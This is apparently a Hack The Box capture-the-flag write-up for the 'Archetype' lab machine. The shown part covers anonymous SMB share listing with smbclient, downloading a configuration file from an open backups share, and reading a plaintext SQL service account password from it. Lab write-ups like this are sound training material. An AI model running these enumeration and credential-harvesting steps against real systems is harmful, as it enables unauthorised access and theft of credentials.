# Archetype Write-up

<img src="https://labs.hackthebox.com/storage/avatars/b39473da3f36b9b5718d6c76eb573a10.png" width="200" height="200">

`smbclient -N -L \\\\10.129.230.97`

     
    
            Sharename       Type      Comment
            ---------       ----      -------
            ADMIN$          Disk      Remote Admin
            backups         Disk      
            C$              Disk      Default share
            IPC$            IPC       Remote IPC
    tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT
    Reconnecting with SMB1 for workgroup listing.
    do_connect: Connection to 10.129.230.97 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
    Unable to connect with SMB1 -- no workgroup available

`smbclient -N \\\\10.129.230.97\\backups`
                                                                                                                                                                                                                                                
    Try "help" to get a list of possible commands.
    smb: \> dir
      .                                   D        0  Mon Jan 20 07:20:57 2020
      ..                                  D        0  Mon Jan 20 07:20:57 2020
      prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020
    
                    5056511 blocks of size 4096. 2617662 blocks available
    smb: \> get prod.dtsConfig
    getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
    smb: \> exit

`cat prod.dtsConfig `

    <DTSConfiguration>
        <DTSConfigurationHeading>
            <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
        </DTSConfigurationHeading>
        <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
            <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
        </Configuration>
    </DTSConfiguration>     
